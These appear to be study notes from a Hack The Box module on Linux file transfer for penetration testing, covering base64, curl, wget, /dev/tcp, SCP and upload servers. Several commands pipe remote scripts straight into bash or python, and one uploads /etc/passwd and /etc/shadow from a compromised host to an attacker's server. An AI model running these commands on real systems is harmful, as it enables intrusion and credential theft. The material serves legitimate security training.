

Linux is a versatile operating system, which commonly has many different tools we can use to perform file transfers. Understanding file transfer methods in Linux can help attackers and defenders improve their skills to attack networks and prevent sophisticated attacks.

A few years ago, we were contacted to perform incident response on some web servers. We found multiple threat actors in six out of the nine web servers we investigated. The threat actor found a SQL Injection vulnerability. They used a Bash script that, when executed, attempted to download another piece of malware that connected to the threat actor's command and control server.

The Bash script they used tried three download methods to get the other piece of malware that connected to the command and control server. Its first attempt was to use `cURL`. If that failed, it attempted to use `wget`, and if that failed, it used `Python`. All three methods use `HTTP` to communicate.

Although Linux can communicate via FTP, SMB like Windows, most malware on all different operating systems uses `HTTP` and `HTTPS` for communication.

This section will review multiple ways to transfer files on Linux, including HTTP, Bash, SSH, etc.



We can still perform base64 to trasnfer files 


## Base64 Encoding / Decoding

Depending on the file size we want to transfer, we can use a method that does not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its content into the terminal and perform the reverse operation. Let's see how we can do this with Bash.

#### Pwnbox - Check File MD5 hash

```shell-session
JackTheWizard@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

We use `cat` to print the file content, and base64 encode the output using a pipe `|`. We used the option `-w 0` to create only one line and ended up with the command with a semi-colon (;) and `echo` keyword to start a new line and make it easier to copy.

#### Pwnbox - Encode SSH Key to Base64

```shell-session
JackTheWizard@htb[/htb]$ cat id_rsa |base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```

We copy this content, paste it onto our Linux target machine, and use `base64` with the option `-d' to decode it.

#### Linux - Decode the File

```shell-session
JackTheWizard@htb[/htb]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
```

Finally, we can confirm if the file was transferred successfully using the `md5sum` command.

#### Linux - Confirm the MD5 Hashes Match

```shell-session
JackTheWizard@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```



when using wget or curl use -O and -o to specify output file name


## Fileless Attacks Using Linux

Because of the way Linux works and how [pipes operate](https://www.geeksforgeeks.org/piping-in-unix-or-linux/), most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.

**Note:** Some payloads such as `mkfifo` write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload chosen it may create temporary files on the OS.

Let's take the `cURL` command we used, and instead of downloading LinEnum.sh, let's execute it directly using a pipe.

#### Fileless Download with cURL

```shell-session
JackTheWizard@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

Similarly, we can download a Python script file from a web server and pipe it into the Python binary. Let's do that, this time using `wget`.

#### Fileless Download with wget

```shell-session
JackTheWizard@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```

---

## Download with Bash (/dev/tcp)

There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.

#### Connect to the Target Webserver

```shell-session
JackTheWizard@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```

#### HTTP GET Request

```shell-session
JackTheWizard@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

#### Print the Response

```shell-session
JackTheWizard@htb[/htb]$ cat <&3
```

---

## SSH Downloads

SSH (or Secure Shell) is a protocol that allows secure access to remote computers. SSH implementation comes with an `SCP` utility for remote file transfer that, by default, uses the SSH protocol.

`SCP` (secure copy) is a command-line utility that allows you to copy files and directories between two hosts securely. We can copy our files from local to remote servers and from remote servers to our local machine.

`SCP` is very similar to `copy` or `cp`, but instead of providing a local path, we need to specify a username, the remote IP address or DNS name, and the user's credentials.

Before we begin downloading files from our target Linux machine to our Pwnbox, let's set up an SSH server in our Pwnbox.

#### Enabling the SSH Server

```shell-session
JackTheWizard@htb[/htb]$ sudo systemctl enable ssh

Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
Executing: /lib/systemd/systemd-sysv-install enable ssh
Use of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, <DATA> line 45
...SNIP...
```

#### Starting the SSH Server

```shell-session
JackTheWizard@htb[/htb]$ sudo systemctl start ssh
```

#### Checking for SSH Listening Port

```shell-session
JackTheWizard@htb[/htb]$ netstat -lnpt

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - 
```

Now we can begin transferring files. We need to specify the IP address of our Pwnbox and the username and password.

#### Linux - Downloading Files Using SCP

```shell-session
JackTheWizard@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
```

**Note:** You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.

---

## Upload Operations

There are also situations such as binary exploitation and packet capture analysis, where we must upload files from our target machine onto our attack host. The methods we used for downloads will also work for uploads. Let's see how we can upload files in various ways.

---

## Web Upload

As mentioned in the `Windows File Transfer Methods` section, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python `HTTP.Server` module, which includes a file upload page. For this Linux example, let's see how we can configure the `uploadserver` module to use `HTTPS` for secure communication.

The first thing we need to do is to install the `uploadserver` module.

#### Pwnbox - Start Web Server

```shell-session
JackTheWizard@htb[/htb]$ sudo python3 -m pip install --user uploadserver

Collecting uploadserver
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

Now we need to create a certificate. In this example, we are using a self-signed certificate.

#### Pwnbox - Create a Self-Signed Certificate

```shell-session
JackTheWizard@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

Generating a RSA private key
................................................................................+++++
.......+++++
writing new private key to 'server.pem'
-----
```

The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.

#### Pwnbox - Start Web Server

```shell-session
JackTheWizard@htb[/htb]$ mkdir https && cd https
```

```shell-session
JackTheWizard@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```

Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.

#### Linux - Upload Multiple Files

```shell-session
JackTheWizard@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

We used the option `--insecure` because we used a self-signed certificate that we trust.

---

## Alternative Web File Transfer Method

Since Linux distributions usually have `Python` or `php` installed, starting a web server to transfer files is straightforward. Also, if the server we compromised is a web server, we can move the files we want to transfer to the web server directory and access them from the web page, which means that we are downloading the file from our Pwnbox.

It is possible to stand up a web server using various languages. A compromised Linux machine may not have a web server installed. In such cases, we can use a mini web server. What they perhaps lack in security, they make up for flexibility, as the webroot location and listening ports can quickly be changed.

#### Linux - Creating a Web Server with Python3

```shell-session
JackTheWizard@htb[/htb]$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```



## SCP Upload

We may find some companies that allow the `SSH protocol` (TCP/22) for outbound connections, and if that's the case, we can use an SSH server with the `scp` utility to upload files. Let's attempt to upload a file to the target machine using the SSH protocol.

#### File Upload using SCP

```shell-session
JackTheWizard@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/

htb-student@10.129.86.90's password: 
passwd                                                  
```

You can use gunzip to unzip zip fiels